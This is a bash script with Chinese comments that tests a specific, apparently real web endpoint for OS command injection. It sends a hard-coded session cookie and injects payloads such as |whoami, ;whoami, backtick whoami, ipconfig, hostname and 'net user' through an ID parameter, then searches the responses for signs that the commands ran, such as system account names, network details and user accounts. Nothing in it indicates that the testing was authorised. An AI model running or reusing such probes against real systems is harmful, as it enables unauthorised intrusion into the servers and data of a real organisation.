#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 验证命令注入 - 详细分析"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 基线响应
echo "[1] 基线请求 (正常ID)..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -H "Cookie: $COOKIE" \
    -o baseline_cmd.html 2>&1
baseline_size=$(wc -c < baseline_cmd.html)
echo "  基线大小: $baseline_size bytes"

# 命令注入尝试1: |whoami
echo -e "\n[2] 测试: ID=|whoami"
curl -sk "${BASE}/report/inBCC.aspx?ID=%7Cwhoami" \
    -H "Cookie: $COOKIE" \
    -o test_pipe_whoami.html 2>&1
test1_size=$(wc -c < test_pipe_whoami.html)
echo "  响应大小: $test1_size bytes"
echo "  差异: $((test1_size - baseline_size)) bytes"

# 搜索关键字
if grep -qi "NT AUTHORITY\|SYSTEM\|iis apppool\|network service" test_pipe_whoami.html; then
    echo "  🔥🔥🔥 命令注入成功! 找到用户名!"
    grep -i "NT AUTHORITY\|SYSTEM\|iis apppool\|network service" test_pipe_whoami.html
elif grep -qi "whoami" test_pipe_whoami.html; then
    echo "  ⚠️  可能有响应，但未明确"
    grep -i "whoami" test_pipe_whoami.html | head -5
fi

# 命令注入尝试2: ;whoami
echo -e "\n[3] 测试: ID=;whoami"
curl -sk "${BASE}/report/inBCC.aspx?ID=%3Bwhoami" \
    -H "Cookie: $COOKIE" \
    -o test_semi_whoami.html 2>&1
test2_size=$(wc -c < test_semi_whoami.html)
echo "  响应大小: $test2_size bytes"
echo "  差异: $((test2_size - baseline_size)) bytes"

if grep -qi "NT AUTHORITY\|SYSTEM\|iis apppool\|network service" test_semi_whoami.html; then
    echo "  🔥🔥🔥 命令注入成功!"
    grep -i "NT AUTHORITY\|SYSTEM\|iis apppool\|network service" test_semi_whoami.html
fi

# 命令注入尝试3: `whoami`
echo -e "\n[4] 测试: ID=\`whoami\`"
curl -sk "${BASE}/report/inBCC.aspx?ID=%60whoami%60" \
    -H "Cookie: $COOKIE" \
    -o test_backtick_whoami.html 2>&1
test3_size=$(wc -c < test_backtick_whoami.html)
echo "  响应大小: $test3_size bytes"
echo "  差异: $((test3_size - baseline_size)) bytes"

if grep -qi "NT AUTHORITY\|SYSTEM\|iis apppool\|network service" test_backtick_whoami.html; then
    echo "  🔥🔥🔥 命令注入成功!"
    grep -i "NT AUTHORITY\|SYSTEM\|iis apppool\|network service" test_backtick_whoami.html
fi

# 更多命令测试
echo -e "\n[5] 测试其他命令..."

# ID=MAU2|ipconfig
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%7Cipconfig" \
    -H "Cookie: $COOKIE" \
    -o test_ipconfig.html 2>&1
if grep -qi "IPv4\|Subnet\|Gateway\|Ethernet" test_ipconfig.html; then
    echo "  ✅ ipconfig 成功!"
    grep -E "IPv4|Subnet|Gateway" test_ipconfig.html | head -10
fi

# ID=MAU2|hostname
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%7Chostname" \
    -H "Cookie: $COOKIE" \
    -o test_hostname.html 2>&1
hostname_result=$(cat test_hostname.html | grep -oE "[A-Z0-9-]{3,}")
if [ -n "$hostname_result" ]; then
    echo "  ✅ hostname 成功: $hostname_result"
fi

# ID=MAU2|net user
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%7Cnet+user" \
    -H "Cookie: $COOKIE" \
    -o test_netuser.html 2>&1
if grep -qi "Administrator\|Guest\|User accounts" test_netuser.html; then
    echo "  ✅ net user 成功!"
    grep -i "Administrator\|Guest" test_netuser.html | head -10
fi

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 结果文件:"
ls -lh test_*.html baseline_cmd.html 2>/dev/null
